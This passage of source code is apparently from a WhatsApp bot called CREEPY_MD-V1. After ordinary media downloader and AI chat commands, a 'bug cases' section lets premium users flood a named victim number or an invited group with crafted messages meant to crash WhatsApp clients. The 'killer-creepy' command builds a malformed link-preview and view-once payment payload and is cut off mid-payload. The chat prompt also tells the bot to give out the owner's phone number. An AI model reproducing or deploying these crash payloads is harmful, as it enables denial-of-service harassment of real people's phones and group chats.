                video: Buffer.from(hdBuffer.data),
                mimetype: 'video/mp4',
                fileName: `${title}_HD.mp4`,
                caption: `*Title:* ${title}\n*Quality:* HD\n> *CREEPY_MD-V1*`
              }, { quoted: m });
            }
            if (low_quality) {
              await GlobalTechInc.sendMessage(m.chat, {
                video: Buffer.from(sdBuffer.data),
                mimetype: 'video/mp4',
                fileName: `${title}_SD.mp4`,
                caption: `*Title:* ${title}\n*Quality:* SD\n> *CREEPY_MD-V1*`
              }, { quoted: m });
            }
          }
        } else {
          replyglobal("❌ Unable to fetch the Instagram content. Please check the URL and try again.");
        }
      } catch (error) {
        console.error('Error in Instagram Downloader:', error.message);
        replyglobal("❌ An error occurred while processing your request. Please try again later.");
      }
      break;
}

// TikTok Command
case 'tiktok': {
    if (!text) return replyglobal(`Example: ${prefix + command} https://www.tiktok.com/video/xxxxx`);
    await GlobalTechInc.sendMessage(`Downloading TikTok video...`);
    
    try {
        const apiUrl = `https://apis.davidcyriltech.my.id/download/aio?url=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);
    
        if (response.data.success) {
          const { title, low_quality, high_quality } = response.data.video;
    
          const isDirectDownloadHD = high_quality.includes("tinyurl");
          const isDirectDownloadSD = low_quality.includes("tinyurl");
    
          if (isDirectDownloadHD || isDirectDownloadSD) {
            if (isDirectDownloadHD) {
              await GlobalTechInc.sendMessage(m.chat, {
                video: { url: high_quality },
                mimetype: 'video/mp4',
                fileName: `${title}_HD.mp4`,
                caption: `*Title:* ${title}\n*Quality:* HD\n> *CREEPY_MD-V1*`
              }, { quoted: m });
            }
            if (isDirectDownloadSD) {
              await GlobalTechInc.sendMessage(m.chat, {
                video: { url: low_quality },
                mimetype: 'video/mp4',
                fileName: `${title}_SD.mp4`,
                caption: `*Title:* ${title}\n*Quality:* SD\n> *CREEPY_MD-V1*`
              }, { quoted: m });
            }
          } else {
            await GlobalTechInc.sendMessage(m.chat, { react: { text: `📥`, key: m?.key } });
    
            const hdBuffer = await axios.get(high_quality, { responseType: 'arraybuffer' });
            const sdBuffer = await axios.get(low_quality, { responseType: 'arraybuffer' });
    
            if (high_quality) {
              await GlobalTechInc.sendMessage(m.chat, {
                video: Buffer.from(hdBuffer.data),
                mimetype: 'video/mp4',
                fileName: `${title}_HD.mp4`,
                caption: `*Title:* ${title}\n*Quality:* HD\n> *CREEPY_MD-V1*`
              }, { quoted: m });
            }
            if (low_quality) {
              await GlobalTechInc.sendMessage(m.chat, {
                video: Buffer.from(sdBuffer.data),
                mimetype: 'video/mp4',
                fileName: `${title}_SD.mp4`,
                caption: `*Title:* ${title}\n*Quality:* SD\n> *CREEPY_MD-V1*`
              }, { quoted: m });
            }
          }
        } else {
          replyglobal("❌ Unable to fetch the TikTok video. Please check the URL and try again.");
        }
      } catch (error) {
        console.error('Error in TikTok Downloader:', error.message);
        replyglobal("❌ An error occurred while processing your request. Please try again later.");
      }
      break;
}

// Facebook Command
case 'facebook': {
    if (!text) return replyglobal(`Example: ${prefix + command} https://www.facebook.com/video/link`);
    await GlobalTechInc.sendMessage(`Downloading Facebook content...`);
    
    try {
        const apiUrl = `https://apis.davidcyriltech.my.id/download/aio?url=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);
    
        if (response.data.success) {
          const { title, low_quality, high_quality } = response.data.video;
    
          const isDirectDownloadHD = high_quality.includes("tinyurl");
          const isDirectDownloadSD = low_quality.includes("tinyurl");
    
          if (isDirectDownloadHD || isDirectDownloadSD) {
            if (isDirectDownloadHD) {
              await GlobalTechInc.sendMessage(m.chat, {
                video: { url: high_quality },
                mimetype: 'video/mp4',
                fileName: `${title}_HD.mp4`,
                caption: `*Title:* ${title}\n*Quality:* HD\n> *CREEPY_MD-V1*`
              }, { quoted: m });
            }
            if (isDirectDownloadSD) {
              await GlobalTechInc.sendMessage(m.chat, {
                video: { url: low_quality },
                mimetype: 'video/mp4',
                fileName: `${title}_SD.mp4`,
                caption: `*Title:* ${title}\n*Quality:* SD\n> *CREEPY_MD-V1*`
              }, { quoted: m });
            }
          } else {
            await GlobalTechInc.sendMessage(m.chat, { react: { text: `📥`, key: m?.key } });
    
            const hdBuffer = await axios.get(high_quality, { responseType: 'arraybuffer' });
            const sdBuffer = await axios.get(low_quality, { responseType: 'arraybuffer' });
    
            if (high_quality) {
              await GlobalTechInc.sendMessage(m.chat, {
                video: Buffer.from(hdBuffer.data),
                mimetype: 'video/mp4',
                fileName: `${title}_HD.mp4`,
                caption: `*Title:* ${title}\n*Quality:* HD\n> *CREEPY_MD-V1*`
              }, { quoted: m });
            }
            if (low_quality) {
              await GlobalTechInc.sendMessage(m.chat, {
                video: Buffer.from(sdBuffer.data),
                mimetype: 'video/mp4',
                fileName: `${title}_SD.mp4`,
                caption: `*Title:* ${title}\n*Quality:* SD\n> *CREEPY_MD-V1*`
              }, { quoted: m });
            }
          }
        } else {
          replyglobal("❌ Unable to fetch the Facebook video. Please check the URL and try again.");
        }
      } catch (error) {
        console.error('Error in Facebook Downloader:', error.message);
        replyglobal("❌ An error occurred while processing your request. Please try again later.");
      }
      break;
}

// AIO Command (Fallback for other cases like TikTok, Facebook, etc.)
case 'aio': {
    if (!text) return replyglobal(`Example: ${prefix + command} https://www.somevideolink.com`);
    await GlobalTechInc.sendMessage(`Downloading content...`);
    
    try {
        const apiUrl = `https://apis.davidcyriltech.my.id/download/aio?url=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);
    
        if (response.data.success) {
          const { title, low_quality, high_quality } = response.data.video;
    
          const isDirectDownloadHD = high_quality.includes("tinyurl");
          const isDirectDownloadSD = low_quality.includes("tinyurl");
    
          if (isDirectDownloadHD || isDirectDownloadSD) {
            if (isDirectDownloadHD) {
              await GlobalTechInc.sendMessage(m.chat, {
                video: { url: high_quality },
                mimetype: 'video/mp4',
                fileName: `${title}_HD.mp4`,
                caption: `*Title:* ${title}\n*Quality:* HD\n> *CREEPY_MD-V1*`
              }, { quoted: m });
            }
            if (isDirectDownloadSD) {
              await GlobalTechInc.sendMessage(m.chat, {
                video: { url: low_quality },
                mimetype: 'video/mp4',
                fileName: `${title}_SD.mp4`,
                caption: `*Title:* ${title}\n*Quality:* SD\n> *CREEPY_MD-V1*`
              }, { quoted: m });
            }
          } else {
            await GlobalTechInc.sendMessage(m.chat, { react: { text: `📥`, key: m?.key } });
    
            const hdBuffer = await axios.get(high_quality, { responseType: 'arraybuffer' });
            const sdBuffer = await axios.get(low_quality, { responseType: 'arraybuffer' });
    
            if (high_quality) {
              await GlobalTechInc.sendMessage(m.chat, {
                video: Buffer.from(hdBuffer.data),
                mimetype: 'video/mp4',
                fileName: `${title}_HD.mp4`,
                caption: `*Title:* ${title}\n*Quality:* HD\n> *CREEPY_MD-V1*`
              }, { quoted: m });
            }
            if (low_quality) {
              await GlobalTechInc.sendMessage(m.chat, {
                video: Buffer.from(sdBuffer.data),
                mimetype: 'video/mp4',
                fileName: `${title}_SD.mp4`,
                caption: `*Title:* ${title}\n*Quality:* SD\n> *CREEPY_MD-V1*`
              }, { quoted: m });
            }
          }
        } else {
          replyglobal("❌ Unable to fetch the video. Please check the URL and try again.");
        }
      } catch (error) {
        console.error('Error in AIO Downloader:', error.message);
        replyglobal("❌ An error occurred while processing your request. Please try again later.");
      }
      break;
}


//facebook insta and tiktok end


case 'play': case 'song': {
    if (!text) {
        return replyglobal(`Example: ${prefix + command} Justin Bieber Ghost`);
    }

    try {
        let kyuu = await fetchJson(`https://api.agatz.xyz/api/ytsearch?message=${encodeURIComponent(text)}`);
        let songData = kyuu.data[0];
        if (!songData) {
            return replyglobal("Song not found. Please try another search.");
        }

        // Send a "Playing song requested" message with a large thumbnail at the bottom
        await GlobalTechInc.sendMessage(m.chat, {
            text: `🎵 *Playing:* ${songData.title}`,
            contextInfo: {
                forwardingScore: 5,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: "CREEPY TECH",
                    newsletterJid: "120363307517794567@newsletter",
                },
                externalAdReply: {
                    title: "CREEPY_MD-V1",
                    body: `𝐷𝛥𝛮𝛮𝑌`,
                    thumbnailUrl: songData.thumbnail || 'https://files.catbox.moe/54w3b1.jpeg', // Use thumbnail or default
                    sourceUrl: global.link,
                    mediaType: 1,
                    renderLargerThumbnail: true, // Render the large thumbnail below
                    thumbnailHeight: 500,
                    thumbnailWidth: 500, // Ensure thumbnail is large
                },
            },
        }, { quoted: m });

        // Fetch audio URL
        let tylor = await fetchJson(`https://api.nexoracle.com/downloader/yt-audio2?apikey=free_key@maher_apis&url=${songData.url}`);
        let audioUrl = tylor.result.audio;
        if (!audioUrl) {
            return replyglobal("Unable to fetch audio. Please try again.");
        }

        // Send the song as an audio file
        await GlobalTechInc.sendMessage(m.chat, {
            audio: { url: audioUrl },
            fileName: `${songData.title}.mp3`,
            mimetype: "audio/mpeg",
            contextInfo: {
                forwardingScore: 5,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: "CREEPY TECH",
                    newsletterJid: "120363307517794567@newsletter",
                },
                externalAdReply: {
                    title: "CREEPY_MD-V1",
                    body: `${songData.title}.mp3`,
                    thumbnailUrl: songData.thumbnail || 'https://files.catbox.moe/54w3b1.jpeg',
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    thumbnailHeight: 500,
                    thumbnailWidth: 500,
                },
            },
        }, { quoted: m });

    } catch (error) {
        console.error("Error in play command:", error);
        replyglobal("An error occurred while processing your request. Please try again later.");
    }
}
break;

case 'video': case 'vid': {
    if (!text) {
        return replyglobal(`Example: ${prefix + command} Justin Bieber Ghost`);
    }

    try {
        let searchResult = await fetchJson(`https://api.agatz.xyz/api/ytsearch?message=${encodeURIComponent(text)}`);
        let videoData = searchResult.data[0];
        if (!videoData) {
            return replyglobal("Video not found. Please try another search.");
        }

        // Send "Fetching video" message with a large thumbnail
        await GlobalTechInc.sendMessage(m.chat, {
            text: `📽 *Playing Video:* ${videoData.title}`,
            contextInfo: {
                forwardingScore: 5,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: "CREEPY TECH",
                    newsletterJid: "120363307517794567@newsletter",
                },
                externalAdReply: {
                    title: "CREEPY_MD-V1",
                    body: "𝐷𝛥𝛮𝛮𝑌",
                    thumbnailUrl: videoData.thumbnail || 'https://files.catbox.moe/54w3b1.jpeg', // Default if no thumbnail
                    sourceUrl: global.link,
                    mediaType: 1,
                    renderLargerThumbnail: true, 
                    thumbnailHeight: 500,
                    thumbnailWidth: 500, 
                },
            },
        }, { quoted: m });

        // Fetch video URL
        let fetchVideo = await fetchJson(`https://api.nexoracle.com/downloader/yt-video2?apikey=free_key@maher_apis&url=${videoData.url}`);
        let videoUrl = fetchVideo.result.video;
        if (!videoUrl) {
            return replyglobal("Unable to fetch video. Please try again.");
        }

        // Send the video file
        await GlobalTechInc.sendMessage(m.chat, {
            video: { url: videoUrl },
            fileName: `${videoData.title}.mp4`,
            mimetype: "video/mp4",
        }, { quoted: m });

    } catch (error) {
        console.error("Error in playvideo command:", error);
        replyglobal("An error occurred while processing your request. Please try again later.");
    }
}
break;

case 'ytmp3': case 'ytaudio': {
    if (!text) {
        return replyglobal(`Example: ${prefix + command} https://youtube.com/shorts/7Hzb0fvSLPk?si=UZX8lW_k0yuEjAEb`);
    }

    try {
        let response = await fetchJson(`https://api.nexoracle.com/downloader/yt-audio2?apikey=free_key@maher_apis&url=${encodeURIComponent(text)}`);
        let audioUrl = response.result.audio;
        if (!audioUrl) {
            return replyglobal("Failed to fetch audio. Please try again.");
        }

        await GlobalTechInc.sendMessage(m.chat, {
            text: `🎵 *Downloading Audio:* ${text}`,
            contextInfo: {
                forwardingScore: 5,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: "CREEPY TECH",
                    newsletterJid: "120363307517794567@newsletter",
                },
                externalAdReply: {
                    title: "CREEPY_MD-V1",
                    body: "𝐷𝛥𝛮𝛮𝑌",
                    thumbnailUrl: response.result.thumbnail || 'https://files.catbox.moe/54w3b1.jpeg',
                    mediaType: 1,
                    renderLargerThumbnail: true,
                },
            },
        }, { quoted: m });

        await GlobalTechInc.sendMessage(m.chat, {
            audio: { url: audioUrl },
            fileName: `${response.result.title}.mp3`,
            mimetype: "audio/mpeg",
        }, { quoted: m });

    } catch (error) {
        console.error("Error in YTMP3/YTAUDIO command:", error);
        replyglobal("An error occurred while processing your request. Please try again.");
    }
}
break;

case 'ytmp4': case 'ytvideo': {
    if (!text) {
        return replyglobal(`Example: ${prefix + command} https://youtube.com/shorts/7Hzb0fvSLPk?si=UZX8lW_k0yuEjAEb`);
    }

    try {
        let response = await fetchJson(`https://api.nexoracle.com/downloader/yt-video2?apikey=free_key@maher_apis&url=${encodeURIComponent(text)}`);
        let videoUrl = response.result.video;
        if (!videoUrl) {
            return replyglobal("Failed to fetch video. Please try again.");
        }

        await GlobalTechInc.sendMessage(m.chat, {
            text: `🎥 *Downloading Video:* ${text}`,
            contextInfo: {
                forwardingScore: 5,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: "CREEPY TECH",
                    newsletterJid: "120363307517794567@newsletter",
                },
                externalAdReply: {
                    title: "CREEPY_MD-V1",
                    body: "𝐷𝛥𝛮𝛮𝑌.",
                    thumbnailUrl: response.result.thumbnail || 'https://files.catbox.moe/54w3b1.jpeg',
                    mediaType: 1,
                    renderLargerThumbnail: true,
                },
            },
        }, { quoted: m });

        await GlobalTechInc.sendMessage(m.chat, {
            video: { url: videoUrl },
            fileName: `${response.result.title}.mp4`,
            mimetype: "video/mp4",
        }, { quoted: m });

    } catch (error) {
        console.error("Error in YTMP4/YTVIDEO command:", error);
        replyglobal("An error occurred while processing your request. Please try again.");
    }
}
break;

//Image downloader
case 'imgcr':{
    if (!text) return replyglobal(`Provide a prompt to create the image.`);
    await GlobalTechInc.sendMessage(`Generating your image please wait...`);
  }
  
  try {
    const apiUrl = `https://apis.davidcyriltech.my.id/flux?prompt=${encodeURIComponent(text)}`;
    await GlobalTechInc.sendMessage(m.chat, {
      image: { url: apiUrl },
      caption: `*Creepyfy Image Generator*\n\n*Prompt:* ${text}\n> *CREEPY_MD-V1*`,
    }, { quoted: m });
  } catch (error) {
    console.error('Error in Flux command:', error);
    replyglobal(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
  }
  break

case 'imgcr2': {
    if (!text) return replyglobal('Provide a prompt to create the image.');
}
    try {
        const apiUrl = `https://api.paxsenix.biz.id/ai-image/dalle?prompt=${encodeURIComponent(text)}`;
        await GlobalTechInc.sendMessage(m.chat, {
          image: { url: apiUrl },
          caption: `*Creepyfy Image Gen*\n\n*Prompt:* ${text}\n> *CREEPY_MD-V1*`,
        }, { quoted: m });
      } catch (error) {
        console.error('Error in Flux command:', error);
        replyglobal(`*AN ERROR OCCURRED!!:\nReasons:*\n\n> ${error.message}`);
      }
    break

//ai chats
case "ai": 
case "Danny": {
    if (!text) return replyglobal("Please tell me something!..");

    // Initialize user history if not exists
    if (!global.userChats) global.userChats = {};
    if (!global.userChats[m.sender]) global.userChats[m.sender] = [];

    // Save user input to chat history
    global.userChats[m.sender].push(`User: ${text}`);

    // If history exceeds 15 messages, remove the oldest message
    if (global.userChats[m.sender].length > 15) {
        global.userChats[m.sender].shift(); // Remove the oldest message
    }

    let userHistory = global.userChats[m.sender].join("\n"); // Get the latest 15 messages

    let prompt = `
    You are CREEPY_MD-V1, a friendly smart WhatsApp bot. Chat naturally without asking repetitive questions and do not tell user what can i assist you.
    - Owner: Danny and your creator Danny (WhatsApp: 255697608274) (Telegram: t.me/DannyTech20)
    - Company Website: https://creepytech.org/
    - personal portfolio: https://danny-tech.vercel.app
    - WhatsApp Channel: https://whatsapp.com/channel/0029VacQFw65Ui2gGv0Kwk1r
    - Telegram Channel: https://t.me/creepytechnology
    - GitHub Repo: https://github.com/DannyTech20/CREEPY_MD-V1.git
    - YouTube chanel: https://youtube.com/@creepy_technology
    - Danny is a developer (HTML, CSS, JS, Node.js), 3D animator, music producer, singer, and video director.
    - important (How to deploy CREEPY_MD-V1 [you], first user should have Discord app, give them discord app link, then give them steps on how to set up and verryfying discord account[all ssteps], then they should have panel, give them free panel links liks [https://bot-hosting.net/?aff=1297254811795722383], then they should download bot file on telegram channel or githb repo, then they will deploy bot, here is a youtube link of guiding them [https://youtu.be/D_cnVT7JXRA?si=vFV4F2M81DvkiPyk])
    - If a girl likes Danny, give her his number.
    - If someone asks for a song, reply with ".play [song name]".
    - If someone asks for a video, reply with ".video [video name]".
    - If asked, say you love your owner/creator.
    
    Conversation history:
    ${userHistory}
    `;

    try {
        let { data } = await axios.get("https://mannoffc-x.hf.space/ai/logic", {
            params: { "q": text, "logic": prompt }
        });

        let botResponse = data.result;
        
        // Save bot response to chat history
        global.userChats[m.sender].push(`Bot: ${botResponse}`);
        
        m.reply(botResponse);
    } catch (e) {
        m.replyglobal("AI error: " + e.message);
        console.log(e);
    }
}
break;


case "gpt": 
case "gpt4": {
    if (!text) return replyglobal("Please tell me something!..");

    // Initialize user history if not exists
    if (!global.userChats) global.userChats = {};
    if (!global.userChats[m.sender]) global.userChats[m.sender] = [];

    // Save user input to chat history
    global.userChats[m.sender].push(`User: ${text}`);

    // If history exceeds 15 messages, remove the oldest message
    if (global.userChats[m.sender].length > 15) {
        global.userChats[m.sender].shift(); // Remove the oldest message
    }

    let userHistory = global.userChats[m.sender].join("\n"); // Get the latest 15 messages

    let prompt = `
    You are CREEPY_MD-V1, a friendly smart WhatsApp bot. Chat naturally without asking repetitive questions and do not tell user what can i assist you.
    - Owner: Danny and your creator Danny (WhatsApp: 255697608274) (Telegram: t.me/DannyTech20)
    - Company Website: https://creepytech.org/
    - personal portfolio: https://danny-tech.vercel.app
    - WhatsApp Channel: https://whatsapp.com/channel/0029VacQFw65Ui2gGv0Kwk1r
    - Telegram Channel: https://t.me/creepytechnology
    - GitHub Repo: https://github.com/DannyTech20/CREEPY_MD-V1.git
    - YouTube chanel: https://youtube.com/@creepy_technology
    - Danny is a developer (HTML, CSS, JS, Node.js), 3D animator, music producer, singer, and video director.
    - important (How to deploy CREEPY_MD-V1 [you], first user should have Discord app, give them discord app link, then give them steps on how to set up and verryfying discord account[all ssteps], then they should have panel, give them free panel links liks like [https://], then they should download bot file on telegram channel or githb repo, then they will deploy bot, here is a youtube link of guiding them [https://])
    - If a girl likes Danny, give her his number.
    - If someone asks for a song, reply with ".play [song name]".
    - If someone asks for a video, reply with ".video [video name]".
    - If asked, say you love your owner/creator.
    
    Conversation history:
    ${userHistory}
    `;

    try {
        let { data } = await axios.get("https://api.paxsenix.biz.id/ai/logic", {
            params: { "q": text, "logic": prompt }
        });

        let botResponse = data.result;
        
        // Save bot response to chat history
        global.userChats[m.sender].push(`Bot: ${botResponse}`);
        
        m.replyglobal(botResponse);
    } catch (e) {
        m.reply("AI error: " + e.message);
        console.log(e);
    }
}
break;



//bug cases

case "creepy-android": {
  if (!isPremium) return replyglobal("This is for Creepy premium users🥱")
  if (!text) return replyglobal(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 2557xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replyglobal(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 2557xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replyglobal("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await GlobalTechInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "923444844060") {
    return;
  }
  if (contactInfo.length == 0) {
    return replyglobal("The number is not registered on WhatsApp");
  }
  replyglobal("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendVariousMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Bot Creepy Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* 😂\n\nPause 2 minutes so that creepy won't stop on your panel.", 
    [whatsappNumber]
  );
}
break;
case "creepy-ios": {
  if (!isPremium) return replyglobal("This is for Creepy premium users🥱")
  if (!text) return replyglobal(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 2557xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replyglobal(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 2557xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replyglobal("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await GlobalTechInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "923444844060") {
    return;
  }
  if (contactInfo.length == 0) {
    return replyglobal("The number is not registered on WhatsApp");
  }
  replyglobal("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Bot Creepy Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that Creepy won't stop on your panel.", 
    [whatsappNumber]
  );
}
break;
case "creepy-ios2":
  {
	if (!isPremium) return replyglobal("This is for Creepy premium users🥱")
    if (!isBot) {
      return replyglobal("*This feature is for the creepy only!*");
    }
    if (!text){
      return replyglobal(`Example usage: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return replyglobal("Amount must be a number");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    replyglobal("please wait, " + command + "  is in process..");
    await sleep(1500); // Adjusted sleep time for clarity
    sendMultiplePaymentInvites(from, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('✅');
  }
  break;
  case "creepy-android2":
  {
	if (!isPremium) return replyglobal("This is for Creepy premium users🥱")
    if (!isBot) {
      return replyglobal("*This feature is for the creepy only!*");
    }
    if (!text){
      return replyglobal(`Example usage: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return replyglobal("Amount must be a number");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    replyglobal("please wait, " + command + " bug is in process..");
    await sleep(1500); // Adjusted sleep time for clarity
    sendVariousMessages(from, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('✅');
  }
  break;
  case "creepy-gc":
  case "creepy-bug-group":
  {
    if (!isPremium) return replyglobal("This is for Creepy premium users🥱")
    if (!text) {
      return replyglobal("*HOW TO SEND BUG TO GROUP*\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nExample: ." + command + " creepy-gc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
    }
    replyglobal("please wait, " + command + "  bug is in process..");
    if (!text.split(" ")[0].includes("whatsapp.com")) {
      return replyglobal("Link Invalid!");
    }
    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
    try {
      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
      let groupTarget = await GlobalTechInc.groupAcceptInvite(groupLink);
      await sleep(2000); // Adjusted sleep time for clarity
      sendViewOnceMessages(groupTarget, bugAmount);
      await sleep(2500); // Adjusted sleep time for clarity
      replyglobal("*DONE✅ BUG HAS BEEN SENT TO THE GROUP!.*");
      GlobalTechInc.groupLeave(groupTarget);
    } catch (error) {
      replyglobal(util.format(error));
    }
  }
  break;
  case "creepy-attack":
  {
	if (!isPremium) return replyglobal("This is for Creepy premium users🥱")
    if (!isBot) {
      return replyglobal("*This feature is for the creepy only!*");
    }
    if (!text){
      return replyglobal(`Example usage: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return replyglobal("Amount must be a number");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    replyglobal("please wait, " + command + " bug is in process..");
    await sleep(1500); // Adjusted sleep time for clarity
    sendViewOnceMessages(from, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('✅');
  }
  break;
  case "creepy-uicrash": {
  if (!isPremium) return replyglobal("This is for Creepy premium users🥱")
  if (!text) return replyglobal(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 2557xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replyglobal(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 2557xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replyglobal("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await GlobalTechInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "923444844060") {
    return;
  }
  if (contactInfo.length == 0) {
    return replyglobal("The number is not registered on WhatsApp");
  }
  replyglobal("please wait, " + command + " crepy-uicrash is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so thattcreepy wont stop on your panel.", 
    [whatsappNumber]
  );
}
break;
case "creepy-smash": {
  if (!isPremium) return replyglobal("This is for Creepy premium users🥱")
  if (!text) return replyglobal(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 2557xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replyglobal(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 2557xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replyglobal("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await GlobalTechInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "923444844060") {
    return;
  }
  if (contactInfo.length == 0) {
    return replyglobal("The number is not registered on WhatsApp");
  }
  replyglobal("please wait, " + command + "  is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendRepeatedMessages2(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that creepy won't stop on your panel.", 
    [whatsappNumber]
  );
}
break;

case 'killer-creepy': {
	if (!isCreator) return replyglobal("😡You are not my owner dude🚫")
if (!text) return replyglobal(`Usage .${command} 255697xxxxxx`)
let cleanedNumber = text.replace(/[^0-9]/g, '');
if (cleanedNumber.startsWith('0')) return replyglobal(`Example : ${prefix+command} 255697xxxxxx`)
var contactInfo = await GlobalTechInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "923444844060") {
    return;
    }
    if (cleanedNumber == "919366316008") {
    return;
    }
    if (cleanedNumber == "919402104403") {
    return;
  }
  if (contactInfo.length == 0) {
    return replyglobal("The number is not registered on WhatsApp");
  }
  async function xeonIosShot(jid) {
    						for (let i = `3`; i !== 0; i -= 1) {
					const crasoh = await GlobalTechInc.relayMessage(jid,
						{
							extendedTextMessage: {
								text: '#CREEPY MD CRASH ☠️🔥',
								matchedText: 'LEGALLY WRONG, ETHICALLY RIGHT',
								canonicalUrl: 'https://example.com',
								description: '#CREEPY MD CRASH ☠️🔥',
								title: '#CREEPY MD CRASH ☠️🔥',
								textArgb: 0xff000000,
								backgroundArgb: 0xffffffff,
								font: 1,
								previewType: 0,
								jpegThumbnail: await getBuffer('https://example.com/thumb.jpg'),
								contextInfo: {
                forwardingScore: 5,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: "CREEPY TECH",
                    newsletterJid: "120363307517794567@newsletter",
                },
								},
								doNotPlayInline: false,
								thumbnailDirectPath: 'https://example.com/thumb.jpg',
								thumbnailSha256: Buffer.from('1234567890abcdef', 'hex'),
								thumbnailEncSha256: Buffer.from('abcdef1234567890', 'hex'),
								mediaKey: Buffer.from(
									'abcdef1234567890abcdef1234567890',
									'hex'
								),
								mediaKeyTimestamp: Date.now(),
								thumbnailHeight: 200,
								thumbnailWidth: 200,
								inviteLinkGroupType: 0, // InviteLinkGroupType.DEFAULT
								inviteLinkParentGroupSubjectV2: 'Parent Group Subject',
								inviteLinkParentGroupThumbnailV2: Buffer.from(
									'abcdef1234567890',
									'hex'
								),
								inviteLinkGroupTypeV2: 0,
								viewOnce: true,
							},
						},
						{ participant: { jid: jid } }
					);
				}
	for (let i = `3`; i !== 0; i -= 1) {
       await GlobalTechInc.relayMessage(
					jid,
					{
						viewOnceMessage: {
							message: {
								messagecontextInfo: {
                forwardingScore: 5,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: "CREEPY TECH",
                    newsletterJid: "120363307517794567@newsletter",
                },
									deviceListMetadataVersion: 2,
									deviceListMetadata: {},
								},
								interactiveMessage: {
									nativeFlowMessage: {
										buttons: [
											{
												name: 'payment_info',
												buttonParamsJson:
